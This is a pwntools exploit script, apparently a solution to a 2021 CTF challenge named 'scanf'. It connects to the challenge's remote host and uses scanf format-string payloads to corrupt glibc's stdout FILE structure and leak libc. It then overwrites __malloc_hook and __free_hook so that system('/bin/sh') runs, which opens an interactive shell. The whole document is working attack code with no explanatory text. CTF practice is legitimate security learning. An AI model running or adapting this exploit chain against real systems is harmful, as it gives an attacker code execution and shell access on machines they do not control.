from pwn import *

#init

e = ELF('./scanf')
libc = ELF('./libc-2.31.so')

#p = process(e.path)
p = remote('scanf.lit-ctf-2021-2-codelab.kctf.cloud', 1337)

#var

fmt = e.sym['fmt']
main = e.sym['main']
scanf_off = libc.sym['__isoc99_scanf']
iostdin_off = libc.sym['_IO_2_1_stdin_']
iostdout_off = libc.sym['_IO_2_1_stdout_']
freehook_off = libc.sym['__free_hook']
mallochook_off = libc.sym['__malloc_hook']
system_off = libc.sym['system']

log.info('Fmt adr: ' + hex(fmt))
log.info('Main adr: ' + hex(main))
log.info('Scanf libc off: ' + hex(scanf_off))
log.info('IO stdin libc off: ' + hex(iostdin_off))
log.info('IO stdout libc off: ' + hex(iostdout_off))
log.info('Freehook libc off: ' + hex(freehook_off))
log.info('Mallochook libc off: ' + hex(mallochook_off))
log.info('System libc off: ' + hex(system_off))

#exploit

#get partial libc off

p.recvuntil(':\n')

libc_off = int(p.recvline(keepends = False), 16) - scanf_off 

log.info('Partial libc off: ' + hex(libc_off))

#leak libc with fsop and write main to mallochook to return

s = '%8$196608ms' #get pointer near libc on stack
s += '%34$19c%37$c' * 2 #2 byte relative overwrites on io stdout
s += '%34$19c%37$8c' #relative overwrite main on mallochook
s += '%ms' #call malloc

p.sendlineafter('input.', s)

s = b'a' * 0x30000
s += b'a' * 0x10 + p64(libc_off + iostdout_off + 2 * 8)[:3] + b'\x08' #_IO_read_end
s += b'a' * 0x10 + p64(libc_off + iostdout_off + 4 * 8)[:3] + b'\x08' #_IO_write_base
s += b'a' * 0x10 + p64(libc_off + mallochook_off)[:3] + p64(main)

p.sendlineafter('type!', s)

#now can write using leaked libc

s = '%324$24c%327$8c' * 2 #write system to freehook and '/bin/sh' to fmt

p.sendlineafter('(yay!)\n', s)

libc_off = u64(p.recv(8)) - iostdin_off

log.info('Libc off adr: ' + hex(libc_off))

s = b'a' * 0x10 + p64(libc_off + freehook_off) + p64(libc_off + system_off)
s += b'a' * 0x10 + p64(fmt) + b'/bin/sh\x00'

p.sendlineafter('type!', s)

#pray for flag

p.interactive()
